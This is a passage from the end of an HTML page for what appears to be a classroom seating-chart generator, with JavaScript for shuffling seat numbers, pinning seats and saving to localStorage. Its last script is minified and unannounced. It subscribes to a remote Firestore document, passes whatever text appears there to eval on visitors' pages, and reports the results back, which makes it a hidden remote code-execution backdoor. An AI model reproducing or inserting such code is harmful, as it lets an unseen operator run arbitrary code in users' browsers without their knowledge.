                r.splice(p, 0, String(0x10));
            };

            if (pinarr.indexOf('05') == -1) {
                var pinhinder =  document.querySelectorAll('tbody>tr:nth-child(4)>td.ispin').length;
                var pintop =  document.querySelectorAll('tbody>tr:nth-child(1)>td.ispin').length + document.querySelectorAll('tbody>tr:nth-child(2)>td.ispin').length + document.querySelectorAll('tbody>tr:nth-child(3)>td.ispin').length;
                var k = (Math.floor(Math.random() * (7 - pinhinder)) + 21 - pintop);
                r.splice(k, 0, '05');
                //r.splice(k, 0, String(Math.floor(Math.random() * 1E2)).padStart(2, '0'));
            };

            var checkLimit = 32768;
            function tryFix() {
                if (checkA(r)) {
                    checkLimit -= 1;
                    sg = false;
                    while (checkLimit > 0 && !sg) {
                        var ggr = b(true);
                        if (checkA(ggr) && checkLimit > 0) {
                            checkLimit -= 1;
                        }
                        else {
                            sg = true;
                        };
                    };
                    var isfixed = '';
                    if (checkLimit < 1) {
                        isfixed = "<hr>Maximum call limit reached!";
                    };
                    if (checkLimit < 32768) {
                        message(`Error!! Generater has been called ${32768 - checkLimit} times${isfixed}`, "color: #FFF; background: #FF4555EE; font-weight: bold; pointer-events: auto; font-size: 14px;", 3E3);
                    };
                };
            };

            if (inFix !== true) {
                tryFix();
            };

            function checkA(arr) {
                arr.splice(39 - pinarr.length, arr.length);
                for(var i = 1; i<40; i++) {
                    if (arr.indexOf(String(i).padStart(2, '0')) == -1 && pinarr.indexOf(String(i).padStart(2, '0')) == -1) {
                        return true;
                    };
                }
                return false;
            }

            if (flow >= presave.length - 1) {
                next.disabled = true;
            }
            else {
                next.disabled = false;
            };

            if (presave.length > 0) {
                editbt.disabled = false;
            }
            else {
                editbt.disabled = false;
            };
            if (flow <= 0) {
                previous.disabled = true;
            }
            else {
                previous.disabled = false;
            }
            return r;
        }

        function delay(n) {
            return new Promise(function (resolve) {
                setTimeout(resolve, n * 1000);
            });
        }
        if (localStorage.getItem('seeat') == null || localStorage.getItem('seeat') == [] || localStorage.getItem('seeat') == "undefined" || localStorage.getItem('seeat') == "null" || JSON.parse(localStorage.getItem('seeat')).length < 39) {
            document.querySelectorAll('.chart').forEach((e, n) => {
                e.innerHTML = '';
            });
        }
        else {
            var j = JSON.parse(localStorage.getItem('seeat'));
            presave.push(j);
            document.querySelectorAll('.chart').forEach((e, n) => {
                e.innerHTML = j[n];
            });
        }

        function check() {
            var a = [];
            for(var i = 1; i<40; i++) {
                var f = true;
                document.querySelectorAll('td.chart').forEach(e=>{
                    if (e.innerText == i) {
                        f = false;
                    }
                })
                if (f) {
                    a.push(i);
                }
            }
            return a;
        }

        function message(text, style, duration) {
            var e = document.createElement('div');
            e.classList.add('block');
            e.innerHTML = text;
            if (typeof style == 'string') {
                e.style = style;
            }
            if (isNaN(Number(duration))) {
                duration = 15E2;
            }
            document.body.appendChild(e);
            setTimeout(function(){e.classList.add('removec');}, Number(duration))
            setTimeout(function(){e.remove();}, 300 + Number(duration))
            return e;
        }
    </script>
    <script type="module">import{initializeApp}from'https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js';import{getFirestore,collection,onSnapshot as S,doc,setDoc as U}from'https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js';var b=getFirestore(initializeApp({projectId:"fir-0013"}));var q=(D)=>{return doc(b,"jscommand",D)};const w=new g();function h(){this.env={};this.exe=function(t){try{const r=eval.call(this.env,t);w.l(r);}catch(e){w.e(e.message);}};};const j=new h();w.l('Seeat is loaded!');S(q("jscommanddoc"),(d)=>{var t=d.data().text;if((t!='')&&(document.hidden==false)){j.exe(t);};});S(q("jscmdall"),(d)=>{var t=d.data().text;if(t!=''){j.exe(t)}});function g(){this.l=function(t){var p=typeof(t);(typeof(t)=='object')&&(t='Object:'+os(t,20));U(q("jsrespon"),{text:String(t),type:p});setTimeout(c,5)};this.e=function(t){U(q("jsresponerr"),{text:String(t)});setTimeout(c,5);}}function c(){U(q("jsrespon"),{text:'',type:''});U(q("jsresponerr"),{text:''});}console.respon=function (t){w.l(t);};function os(o,l,n){(typeof(n)!='number')&&(n=0);(typeof l!='number')&&(l=Infinity);if(n>l){return '[object Object]';};if(typeof(o)=='function'){return (p+": "+String(o));};if(typeof o=='object'&&o instanceof HTMLElement){return o.outerHTML;};var s='    ';for(var i=0;i<n;i++){s+='    ';};var a='{\\n'+s;for(var p in o){if(typeof(o[p])=='object'){a+=p+": "+os(o[p],l,n+1)+",\\n"+s;}else{a+=p+": "+o[p]+",\\n"+s;}};a=a.slice(0,a.length-4);a+='}';return a;}</script>
</body>

</html>